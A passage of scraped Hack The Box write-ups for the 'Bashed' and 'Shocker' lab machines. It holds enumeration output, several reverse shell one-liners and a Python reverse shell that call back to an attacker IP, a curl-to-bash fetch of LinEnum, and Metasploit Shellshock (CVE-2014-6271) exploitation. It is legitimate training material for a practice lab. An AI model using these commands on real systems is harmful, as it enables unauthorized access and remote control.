root root 15 Dec 4 2017 getty.target -\u0026gt; ../getty.target lrwxrwxrwx 1 root root 33 Dec 4 2017 systemd-ask-password-wall.path -\u0026gt; ../systemd-ask-password-wall.path lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-logind.service -\u0026gt; ../systemd-logind.service lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service lrwxrwxrwx 1 root root 32 Dec 4 2017 systemd-user-sessions.service -\u0026gt; ../systemd-user-sessions.service lrwxrwxrwx 1 root root 15 Jan 12 2017 dbus.service -\u0026gt; ../dbus.service lrwxrwxrwx 1 root root 29 May 10 2016 plymouth-quit-wait.service -\u0026gt; ../plymouth-quit-wait.service lrwxrwxrwx 1 root root 24 May 10 2016 plymouth-quit.service -\u0026gt; ../plymouth-quit.service /lib/systemd/system/poweroff.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service lrwxrwxrwx 1 root root 28 May 10 2016 plymouth-poweroff.service -\u0026gt; ../plymouth-poweroff.service /lib/systemd/system/reboot.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service lrwxrwxrwx 1 root root 26 May 10 2016 plymouth-reboot.service -\u0026gt; ../plymouth-reboot.service /lib/systemd/system/sysinit.target.wants: total 0 lrwxrwxrwx 1 root root 24 Dec 4 2017 systemd-udevd.service -\u0026gt; ../systemd-udevd.service lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-update-utmp.service -\u0026gt; ../systemd-update-utmp.service lrwxrwxrwx 1 root root 24 Dec 4 2017 console-setup.service -\u0026gt; ../console-setup.service lrwxrwxrwx 1 root root 20 Dec 4 2017 cryptsetup.target -\u0026gt; ../cryptsetup.target lrwxrwxrwx 1 root root 22 Dec 4 2017 dev-hugepages.mount -\u0026gt; ../dev-hugepages.mount lrwxrwxrwx 1 root root 19 Dec 4 2017 dev-mqueue.mount -\u0026gt; ../dev-mqueue.mount lrwxrwxrwx 1 root root 25 Dec 4 2017 keyboard-setup.service -\u0026gt; ../keyboard-setup.service lrwxrwxrwx 1 root root 28 Dec 4 2017 kmod-static-nodes.service -\u0026gt; ../kmod-static-nodes.service lrwxrwxrwx 1 root root 36 Dec 4 2017 proc-sys-fs-binfmt_misc.automount -\u0026gt; ../proc-sys-fs-binfmt_misc.automount lrwxrwxrwx 1 root root 19 Dec 4 2017 setvtrgb.service -\u0026gt; ../setvtrgb.service lrwxrwxrwx 1 root root 32 Dec 4 2017 sys-fs-fuse-connections.mount -\u0026gt; ../sys-fs-fuse-connections.mount lrwxrwxrwx 1 root root 26 Dec 4 2017 sys-kernel-config.mount -\u0026gt; ../sys-kernel-config.mount lrwxrwxrwx 1 root root 25 Dec 4 2017 sys-kernel-debug.mount -\u0026gt; ../sys-kernel-debug.mount lrwxrwxrwx 1 root root 36 Dec 4 2017 systemd-ask-password-console.path -\u0026gt; ../systemd-ask-password-console.path lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-binfmt.service -\u0026gt; ../systemd-binfmt.service lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-hwdb-update.service -\u0026gt; ../systemd-hwdb-update.service lrwxrwxrwx 1 root root 32 Dec 4 2017 systemd-journal-flush.service -\u0026gt; ../systemd-journal-flush.service lrwxrwxrwx 1 root root 27 Dec 4 2017 systemd-journald.service -\u0026gt; ../systemd-journald.service lrwxrwxrwx 1 root root 36 Dec 4 2017 systemd-machine-id-commit.service -\u0026gt; ../systemd-machine-id-commit.service lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-modules-load.service -\u0026gt; ../systemd-modules-load.service lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-random-seed.service -\u0026gt; ../systemd-random-seed.service lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-sysctl.service -\u0026gt; ../systemd-sysctl.service lrwxrwxrwx 1 root root 37 Dec 4 2017 systemd-tmpfiles-setup-dev.service -\u0026gt; ../systemd-tmpfiles-setup-dev.service lrwxrwxrwx 1 root root 33 Dec 4 2017 systemd-tmpfiles-setup.service -\u0026gt; ../systemd-tmpfiles-setup.service lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-udev-trigger.service -\u0026gt; ../systemd-udev-trigger.service lrwxrwxrwx 1 root root 30 May 10 2016 plymouth-read-write.service -\u0026gt; ../plymouth-read-write.service lrwxrwxrwx 1 root root 25 May 10 2016 plymouth-start.service -\u0026gt; ../plymouth-start.service /lib/systemd/system/sockets.target.wants: total 0 lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-initctl.socket -\u0026gt; ../systemd-initctl.socket lrwxrwxrwx 1 root root 32 Dec 4 2017 systemd-journald-audit.socket -\u0026gt; ../systemd-journald-audit.socket lrwxrwxrwx 1 root root 34 Dec 4 2017 systemd-journald-dev-log.socket -\u0026gt; ../systemd-journald-dev-log.socket lrwxrwxrwx 1 root root 26 Dec 4 2017 systemd-journald.socket -\u0026gt; ../systemd-journald.socket lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-udevd-control.socket -\u0026gt; ../systemd-udevd-control.socket lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-udevd-kernel.socket -\u0026gt; ../systemd-udevd-kernel.socket lrwxrwxrwx 1 root root 14 Jan 12 2017 dbus.socket -\u0026gt; ../dbus.socket /lib/systemd/system/timers.target.wants: total 0 lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-tmpfiles-clean.timer -\u0026gt; ../systemd-tmpfiles-clean.timer /lib/systemd/system/systemd-timesyncd.service.d: total 4.0K -rw-r--r-- 1 root root 251 Jan 12 2017 disable-with-time-daemon.conf /lib/systemd/system/sigpwr.target.wants: total 0 lrwxrwxrwx 1 root root 36 Dec 4 2017 sigpwr-container-shutdown.service -\u0026gt; ../sigpwr-container-shutdown.service /lib/systemd/system/rescue.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service /lib/systemd/system/resolvconf.service.wants: total 0 lrwxrwxrwx 1 root root 42 Dec 4 2017 systemd-networkd-resolvconf-update.path -\u0026gt; ../systemd-networkd-resolvconf-update.path /lib/systemd/system/rc-local.service.d: total 4.0K -rw-r--r-- 1 root root 290 Jan 12 2017 debian.conf /lib/systemd/system/graphical.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service /lib/systemd/system/local-fs.target.wants: total 0 lrwxrwxrwx 1 root root 29 Dec 4 2017 systemd-remount-fs.service -\u0026gt; ../systemd-remount-fs.service /lib/systemd/system/getty.target.wants: total 0 lrwxrwxrwx 1 root root 23 Dec 4 2017 getty-static.service -\u0026gt; ../getty-static.service /lib/systemd/system/busnames.target.wants: total 0 /lib/systemd/system/runlevel1.target.wants: total 0 /lib/systemd/system/runlevel2.target.wants: total 0 /lib/systemd/system/runlevel3.target.wants: total 0 /lib/systemd/system/runlevel4.target.wants: total 0 /lib/systemd/system/runlevel5.target.wants: total 0 /lib/systemd/system-sleep: total 4.0K -rwxr-xr-x 1 root root 92 Mar 17 2016 hdparm /lib/systemd/system-preset: total 4.0K -rw-r--r-- 1 root root 869 Jan 18 2017 90-systemd.preset /lib/systemd/system-generators: total 668K -rwxr-xr-x 1 root root 59K Jan 18 2017 systemd-dbus1-generator -rwxr-xr-x 1 root root 71K Jan 18 2017 systemd-cryptsetup-generator -rwxr-xr-x 1 root root 43K Jan 18 2017 systemd-debug-generator -rwxr-xr-x 1 root root 79K Jan 18 2017 systemd-fstab-generator -rwxr-xr-x 1 root root 39K Jan 18 2017 systemd-getty-generator -rwxr-xr-x 1 root root 119K Jan 18 2017 systemd-gpt-auto-generator -rwxr-xr-x 1 root root 39K Jan 18 2017 systemd-hibernate-resume-generator -rwxr-xr-x 1 root root 39K Jan 18 2017 systemd-insserv-generator -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-rc-local-generator -rwxr-xr-x 1 root root 31K Jan 18 2017 systemd-system-update-generator -rwxr-xr-x 1 root root 103K Jan 18 2017 systemd-sysv-generator /lib/systemd/network: total 12K -rw-r--r-- 1 root root 404 Jan 18 2017 80-container-host0.network -rw-r--r-- 1 root root 482 Jan 18 2017 80-container-ve.network -rw-r--r-- 1 root root 80 Jan 18 2017 99-default.link /lib/systemd/system-shutdown: total 0 [00;33m### SOFTWARE #############################################[00m [00;31m[-] Sudo version:[00m Sudo version 1.8.16 [00;31m[-] Apache version:[00m Server version: Apache/2.4.18 (Ubuntu) Server built: 2017-09-18T15:09:02 [00;31m[-] Apache user configuration:[00m APACHE_RUN_USER=www-data APACHE_RUN_GROUP=www-data [00;31m[-] Installed Apache modules:[00m Loaded Modules: core_module (static) so_module (static) watchdog_module (static) http_module (static) log_config_module (static) logio_module (static) version_module (static) unixd_module (static) access_compat_module (shared) alias_module (shared) auth_basic_module (shared) authn_core_module (shared) authn_file_module (shared) authz_core_module (shared) authz_host_module (shared) authz_user_module (shared) autoindex_module (shared) deflate_module (shared) dir_module (shared) env_module (shared) filter_module (shared) mime_module (shared) mpm_prefork_module (shared) negotiation_module (shared) php7_module (shared) setenvif_module (shared) status_module (shared) [00;33m### INTERESTING FILES ####################################[00m [00;31m[-] Useful file locations:[00m /bin/nc /bin/netcat /usr/bin/wget [00;31m[-] Can we read/write sensitive files:[00m -rw-r--r-- 1 root root 1482 Dec 4 2017 /etc/passwd -rw-r--r-- 1 root root 820 Dec 4 2017 /etc/group -rw-r--r-- 1 root root 575 Oct 22 2015 /etc/profile -rw-r----- 1 root shadow 933 Dec 4 2017 /etc/shadow [00;31m[-] SUID files:[00m -rwsr-xr-x 1 root root 40152 Dec 16 2016 /bin/mount -rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40128 Mar 29 2016 /bin/su -rwsr-xr-x 1 root root 27608 Dec 16 2016 /bin/umount -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping -rwsr-xr-x 1 root root 40432 Mar 29 2016 /usr/bin/chsh -rwsr-xr-x 1 root root 39904 Mar 29 2016 /usr/bin/newgrp -rwsr-xr-x 1 root root 136808 Jan 20 2017 /usr/bin/sudo -rwsr-xr-x 1 root root 49584 Mar 29 2016 /usr/bin/chfn -rwsr-xr-x 1 root root 54256 Mar 29 2016 /usr/bin/passwd -rwsr-xr-x 1 root root 75304 Mar 29 2016 /usr/bin/gpasswd -rwsr-xr-x 1 root root 10624 Feb 9 2017 /usr/bin/vmware-user-suid-wrapper -rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10240 Feb 25 2014 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 428240 Aug 11 2016 /usr/lib/openssh/ssh-keysign [00;31m[-] SGID files:[00m -rwxr-sr-x 1 root shadow 35632 Mar 16 2016 /sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root shadow 35600 Mar 16 2016 /sbin/unix_chkpwd -rwxr-sr-x 1 root shadow 22768 Mar 29 2016 /usr/bin/expiry -rwxr-sr-x 1 root crontab 36080 Apr 5 2016 /usr/bin/crontab -rwxr-sr-x 1 root ssh 358624 Aug 11 2016 /usr/bin/ssh-agent -rwxr-sr-x 1 root shadow 62336 Mar 29 2016 /usr/bin/chage -rwxr-sr-x 1 root tty 27368 Dec 16 2016 /usr/bin/wall -rwxr-sr-x 1 root tty 14752 Mar 1 2016 /usr/bin/bsd-write -rwxr-sr-x 1 root mlocate 39520 Nov 17 2014 /usr/bin/mlocate [00;31m[+] Files with POSIX capabilities set:[00m /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep /usr/bin/mtr = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep [-] Can\u0026#39;t search *.conf files as no keyword was entered [-] Can\u0026#39;t search *.php files as no keyword was entered [-] Can\u0026#39;t search *.log files as no keyword was entered [-] Can\u0026#39;t search *.ini files as no keyword was entered [00;31m[-] All *.conf files in /etc (recursive 1 level):[00m -rw-r--r-- 1 root root 703 May 5 2015 /etc/logrotate.conf -rw-r--r-- 1 root root 604 Jul 2 2015 /etc/deluser.conf -rw-r--r-- 1 root root 497 May 4 2014 /etc/nsswitch.conf -rw-r--r-- 1 root root 14867 Apr 11 2016 /etc/ltrace.conf -rw-r--r-- 1 root root 7788 Dec 4 2017 /etc/ca-certificates.conf -rw-r--r-- 1 root root 552 Mar 16 2016 /etc/pam.conf -rw-r--r-- 1 root root 2084 Sep 5 2015 /etc/sysctl.conf -rw-r--r-- 1 root root 338 Nov 17 2014 /etc/updatedb.conf -rw-r--r-- 1 root root 1260 Mar 16 2016 /etc/ucf.conf -rw-r--r-- 1 root root 2584 Feb 18 2016 /etc/gai.conf -rw-r--r-- 1 root root 4781 Mar 17 2016 /etc/hdparm.conf -rw-r--r-- 1 root root 967 Oct 30 2015 /etc/mke2fs.conf -rw-r--r-- 1 root root 3028 Feb 15 2017 /etc/adduser.conf -rw-r--r-- 1 root root 771 Mar 6 2015 /etc/insserv.conf -rw-r--r-- 1 root root 2969 Nov 10 2015 /etc/debconf.conf -rw-r--r-- 1 root root 92 Oct 22 2015 /etc/host.conf -rw-r--r-- 1 root root 191 Jan 18 2016 /etc/libaudit.conf -rw-r--r-- 1 root root 144 Dec 4 2017 /etc/kernel-img.conf -rw-r--r-- 1 root root 34 Jan 27 2016 /etc/ld.so.conf -rw-r--r-- 1 root root 1371 Jan 27 2016 /etc/rsyslog.conf -rw-r--r-- 1 root root 280 Jun 19 2014 /etc/fuse.conf -rw-r--r-- 1 root root 350 Dec 4 2017 /etc/popularity-contest.conf [00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m /home/scriptmanager/.bash_history /home/arrexel/.bash_history [00;31m[-] Location and Permissions (if accessible) of .bak file(s):[00m -rw-r--r-- 1 root root 3024 Dec 4 2017 /etc/apt/sources.bak [00;31m[-] Any interesting mail in /var/mail:[00m total 8 drwxrwsr-x 2 root mail 4096 Feb 15 2017 . drwxr-xr-x 12 root root 4096 Dec 4 2017 .. [00;33m### SCAN COMPLETE ####################################[00m   1  sudo -u scriptmanager whoami # in /dev/phpbash.php || # Not really persistent setup a reverse shell   1 2 3  nc -lvnp 8081 bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/8081 0\u0026gt;\u0026amp;1 # No success || # Bash reverse shell from pentestmonkey   1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.28 8081 \u0026gt;/tmp/f # Netcat reverse shell from pentestmonkey   1  php -r \u0026#39;$sock=fsockopen(\u0026#34;10.10.14.20\u0026#34;,8081);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; # No hi   1 2 3  cd /var/www/html cd uploads touch test   Privilege Escalation 1 2 3 4 5 6 7 8 9 10 11  locate php-reverse-shell.php cp /usr/share/webshells/php/php-reverse-shell.php ./ # Modify the php-reverse-shell.php IP and PORT wget 10.10.14.28/php-reverse-shell.php python -c \u0026#39;import pty;pty.spawn(\u0026#34;bin/bash\u0026#34;)\u0026#39; sudo -u scriptmanager bash   1  ls -al   1 2 3 4 5 6 7 8 9 10  # Create this on local machine  # test1.py ------------------------------------------------ import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.10.14.28\u0026#34;,1234)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])    import this file to the reversed shell machine  1  wget http://10.10.14.28:80/test1.py ./   1 2 3 4 5 6 7 8 9  # Attacking machine nc -lvnp 1234 python test1.py rm test.py # Soon you will get root cat root.txt - Ans: ********************************    User arrexel flag  1 2 3  cd /home/arrexel cat user.txt - Ans: ********************************   Skills Learned  Basic web fuzzing techniques Locating recently modified files  ","description":"Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted.","id":6,"section":"posts","tags":["OSCP","linux","os command injection","sudo","metasploit","apache"],"title":"Hackthebox - Bashed","uri":"https://hswootan.github.io/en/posts/bashed/"},{"content":"\r\rEnumeration 1  nmap -sC -sV -O -Pn -vv 10.10.10.56 -oA shocker # Using -Pn because it is blocking ping probes   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88  Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 22:32 EST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed Initiating Parallel DNS resolution of 1 host. at 22:32 Completed Parallel DNS resolution of 1 host. at 22:32, 0.01s elapsed Initiating SYN Stealth Scan at 22:32 Scanning 10.10.10.56 [1000 ports] Discovered open port 80/tcp on 10.10.10.56 Discovered open port 2222/tcp on 10.10.10.56 Completed SYN Stealth Scan at 22:32, 0.36s elapsed (1000 total ports) Initiating Service scan at 22:32 Scanning 2 services on 10.10.10.56 Completed Service scan at 22:32, 6.04s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.10.56 Retrying OS detection (try #2) against 10.10.10.56 Retrying OS detection (try #3) against 10.10.10.56 Retrying OS detection (try #4) against 10.10.10.56 Retrying OS detection (try #5) against 10.10.10.56 NSE: Script scanning 10.10.10.56. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.75s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.08s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed Nmap scan report for 10.10.10.56 Host is up, received user-set (0.017s latency). Scanned at 2022-02-06 22:32:08 EST for 18s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 2222/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc= | 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/6%OT=80%CT=1%CU=33894%PV=Y%DS=2%DC=I%G=Y%TM=620092CA OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11 OS:NW6%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Uptime guess: 194.940 days (since Tue Jul 27 00:59:10 2021) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=264 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.20 seconds Raw packets sent: 1110 (52.890KB) | Rcvd: 1071 (46.310KB)   Directory Enum 1 2 3 4 5  dirb http://10.10.10.56 -\u0026gt; + http:/as/10.10.10.56/cgi-bin/ (CODE:403|SIZE:294) + http://10.10.10.56/index.html (CODE:200|SIZE:137) + http://10.10.10.56/server-status (CODE:403|SIZE:299)   search for package in Ubuntu → https://packages.ubuntu.com/\n Dirb in the Forbidden directory → http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294) This time looking for .sh and .pl files  1  dirb http://10.10.10.56/cgi-bin -X .sh,.pl   1  http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:118)    Based on the name of the machine it is a shellshock machine and also because it has cgi-bin with script file  1 2 3 4 5 6 7  locate nse | grep shellshock -\u0026gt; /usr/share/nmap/scripts/http-shellshock.nse less /usr/share/nmap/scripts/http-shellshock.nse -\u0026gt; -- @usage -- nmap -sV -p- --script http-shellshock \u0026lt;target\u0026gt; -- nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls \u0026lt;target\u0026gt;    Add /user.sh instead of /bin  1  nmap -sV -p- -vv --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83  Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 11:34 EST NSE: Loaded 46 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 2) scan. Initiating NSE at 11:34 Completed NSE at 11:34, 0.00s elapsed NSE: Starting runlevel 2 (of 2) scan. Initiating NSE at 11:34 Completed NSE at 11:34, 0.00s elapsed Initiating Ping Scan at 11:34 Scanning 10.10.10.56 [4 ports] Completed Ping Scan at 11:34, 0.02s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 11:34 Completed Parallel DNS resolution of 1 host. at 11:34, 0.01s elapsed Initiating SYN Stealth Scan at 11:34 Scanning 10.10.10.56 [65535 ports] Discovered open port 80/tcp on 10.10.10.56 Discovered open port 2222/tcp on 10.10.10.56 Completed SYN Stealth Scan at 11:35, 15.20s elapsed (65535 total ports) Initiating Service scan at 11:35 Scanning 2 services on 10.10.10.56 Completed Service scan at 11:35, 6.04s elapsed (2 services on 1 host) NSE: Script scanning 10.10.10.56. NSE: Starting runlevel 1 (of 2) scan. Initiating NSE at 11:35 Completed NSE at 11:35, 0.24s elapsed NSE: Starting runlevel 2 (of 2) scan. Initiating NSE at 11:35 Completed NSE at 11:35, 0.06s elapsed Nmap scan report for 10.10.10.56 Host is up, received echo-reply ttl 63 (0.021s latency). Scanned at 2022-02-07 11:34:57 EST for 22s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-shellshock: | VULNERABLE: | HTTP Shellshock vulnerability | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2014-6271 | This web application might be affected by the vulnerability known | as Shellshock. It seems the server is executing commands injected | via malicious HTTP headers. | | Disclosure date: 2014-09-24 | Exploit results: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; | \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;500 Internal Server Error\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Internal Server Error\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The server encountered an internal error or | misconfiguration and was unable to complete | your request.\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Please contact the server administrator at | webmaster@localhost to inform them of the time this error occurred, | and the actions you performed just before this error.\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;More information about this error may be available | in the server error log.\u0026lt;/p\u0026gt; | \u0026lt;hr\u0026gt; | \u0026lt;address\u0026gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80\u0026lt;/address\u0026gt; | \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; | | References: | http://www.openwall.com/lists/oss-security/2014/09/24/10 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169 | http://seclists.org/oss-sec/2014/q3/685 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 |_http-server-header: Apache/2.4.18 (Ubuntu) 2222/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 2) scan. Initiating NSE at 11:35 Completed NSE at 11:35, 0.00s elapsed NSE: Starting runlevel 2 (of 2) scan. Initiating NSE at 11:35 Completed NSE at 11:35, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds Raw packets sent: 65711 (2.891MB) | Rcvd: 65536 (2.621MB)   Exploitation with meterpreter CVE-2014-6271 1 2 3 4 5 6 7 8 9 10 11  msfconsole search CVE-2014-6271 -\u0026gt; exploit/multi/http/apache_mod_cgi_bash_env_exec use exploit/multi/http/apache_mod_cgi_bash_env_exec # This module corresponds to the CVE-2014-6271 set rhosts 10.10.10.56 set targeturi /cgi-bin/user.sh set lhost 10.10.14.35 run   1 2 3 4 5 6 7 8 9  meterpreter\u0026gt; which python meterpreter\u0026gt; which python3 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; # Spawn a stable shell cd home cd shelly cat user.txt -\u0026gt; ********************************   Using LinEnum.sh to enumerate the machine. → LinEnum\n1 2 3  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh python -m SimpleHTTPServer    In the compromised machine  1  curl 10.10.14.35:8000/LinEnum.sh | bash   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  [+] We can sudo without supplying a password! Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl [+] Possible sudo pwnage! /usr/bin/perl ----------------------------------------------- # Also sudo -l -\u0026gt; (root) 